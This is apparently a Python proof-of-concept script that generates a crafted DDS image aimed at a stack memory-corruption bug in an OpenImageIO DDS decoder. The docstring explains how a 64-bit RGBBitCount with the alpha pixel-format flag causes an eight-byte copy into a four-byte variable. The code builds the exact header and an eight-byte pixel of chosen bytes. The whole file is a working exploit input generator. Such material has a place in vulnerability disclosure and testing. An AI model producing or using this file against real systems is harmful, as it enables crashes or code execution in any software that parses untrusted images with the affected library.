#!/usr/bin/env python3
"""Build the minimal DDS that reaches the OpenImageIO 3.1.15.0 stack write.

The vulnerable decoder derives m_Bpp from RGBBitCount and passes it directly
as the length of a memcpy into a four-byte uint32_t. RGBBitCount=64 produces an
eight-byte copy. DDS_PF_ALPHA reaches the mask-based decoding path without
entering the reader's older 8/16/24/32-bit whitelist.
"""

import struct
import sys

DDS_CAPS = 0x00000001
DDS_HEIGHT = 0x00000002
DDS_WIDTH = 0x00000004
DDS_PIXELFORMAT = 0x00001000
DDS_PF_ALPHA = 0x00000001
DDS_CAPS1_TEXTURE = 0x00001000

WIDTH = 1
HEIGHT = 1
BPP_BITS = 64


def build() -> bytes:
    header = b""
    header += b"DDS "
    header += struct.pack("<I", 124)
    header += struct.pack(
        "<I", DDS_CAPS | DDS_HEIGHT | DDS_WIDTH | DDS_PIXELFORMAT
    )
    header += struct.pack("<I", HEIGHT)
    header += struct.pack("<I", WIDTH)
    header += struct.pack("<I", 0)  # pitch, recomputed by the reader
    header += struct.pack("<I", 0)  # depth, normalized to one
    header += struct.pack("<I", 0)  # mipmap count, normalized to one
    header += b"\x00" * (4 * 11)

    # DDS_PIXELFORMAT
    header += struct.pack("<I", 32)
    header += struct.pack("<I", DDS_PF_ALPHA)
    header += struct.pack("<I", 0)  # fourCC; this is not a DX10 header
    header += struct.pack("<I", BPP_BITS)
    header += struct.pack("<I", 0x000000FF)
    header += struct.pack("<I", 0x0000FF00)
    header += struct.pack("<I", 0x00FF0000)
    header += struct.pack("<I", 0x00000000)

    # DDS_CAPS2
    header += struct.pack("<I", DDS_CAPS1_TEXTURE)
    header += struct.pack("<I", 0)
    header += struct.pack("<I", 0)
    header += struct.pack("<I", 0)
    header += struct.pack("<I", 0)
    assert len(header) == 128

    # m_Bpp is eight, so the decoder consumes all eight bytes for this pixel.
    pixel = bytes([0x41, 0x41, 0x41, 0x41, 0xDE, 0xAD, 0xBE, 0xEF])
    return header + pixel


if __name__ == "__main__":
    output = sys.argv[1] if len(sys.argv) > 1 else "poc.dds"
    data = build()
    with open(output, "wb") as stream:
        stream.write(data)
    print(
        f"wrote {output}: {len(data)} bytes "
        f"({WIDTH}x{HEIGHT}, RGBBitCount={BPP_BITS}, m_Bpp=8)"
    )
